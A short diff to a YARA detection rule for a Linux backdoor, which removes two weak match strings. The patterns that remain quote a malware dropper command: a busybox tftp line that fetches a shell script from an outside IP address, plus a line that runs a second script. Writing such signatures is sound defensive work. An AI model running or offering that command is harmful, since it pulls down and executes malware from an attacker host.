@@ -7,8 +7,6 @@ rule backdoor_linux
     strings:
         $a = "sh fuck2.sh"
 	$b = "busybox tftp -g 185.145.131.173 -r fuck1.sh"
-	$c = "MIPS"
-	$d = "GDP"
 
     
 	condition:
